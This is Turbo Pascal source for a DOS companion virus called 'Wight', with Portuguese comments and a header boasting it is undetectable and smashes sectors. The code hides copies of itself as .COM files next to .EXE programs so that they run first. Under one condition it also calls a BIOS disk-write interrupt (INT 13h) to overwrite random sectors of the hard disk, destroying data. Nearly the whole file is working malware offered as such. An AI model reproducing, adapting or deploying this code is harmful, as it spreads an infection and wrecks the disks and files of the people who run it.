{
Spawning Non-Resident EXE infector
Undetectable
Compressed
Smash Sectors
}

{$A+,B-,D-,E-,F-,G+,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$I-}
{$M 2048,0,0}
program Wight;{Undead series}
uses dos;
var i:longint;
    nome,nome2,newname:string[80];
    arquivo:array[1..2] of file;
    buffer:array[1..5000] of byte;
    Flag:integer;

procedure damage;
var r:registers;
begin
  r.es:=seg(buffer);
  r.bx:=ofs(buffer);
  r.ah:=3;
  r.dl:=128;
  r.dh:=random(15);
  r.ch:=random(1000);
  r.cl:=random(17);
  r.al:=01;
  intr($13,r);
end;

function FileExists(FileName: String): Boolean;
begin
  Assign(arquivo[1], FileName);
  Reset(arquivo[1]);
  Close(arquivo[1]);
  FileExists := (IOResult = 0) and (FileName <> '');
end;

{Procura um arquivo e o devolve}
function peganome:string;
var search:SearchRec;
    pnome:string[80];
begin
  FindFirst('*.EXE',AnyFile,search);
  While(DosError=0)Do Begin
    nome:=copy(search.name,1,pos('.',search.name)-1)+'.COM';
    if Not(FileExists(nome))then pnome:=nome;
    FindNext(search);
  End;
  PegaNome:=pnome;
end;

begin
{Pega nome dos programas envolvidos}
  nome2:=paramstr(0);
  nome:=peganome;
  if nome<>'' then begin
    assign(arquivo[1],nome2);
    assign(arquivo[2],nome);
    reset(arquivo[1],1);
    rewrite(arquivo[2],1);
    i:=filesize(arquivo[1]);
    blockread(arquivo[1],buffer,i);
    blockwrite(arquivo[2],buffer,i);
{Esconde os atributos do arquivo}
    close(arquivo[2]);
    setfattr(arquivo[2],hidden);
  end;
{Obtem o nome do programa a executar com seus argumentos}
  newname:=copy(nome2,1,pos('.',nome2)-1)+'.EXE';
  nome2:=' ';
  for i:=1 to paramcount do nome2:=nome2+paramstr(i)+' ';
{Executa o programa}
  if not(fileExists(newname)) then damage;
  exec(newname,nome2);
end.
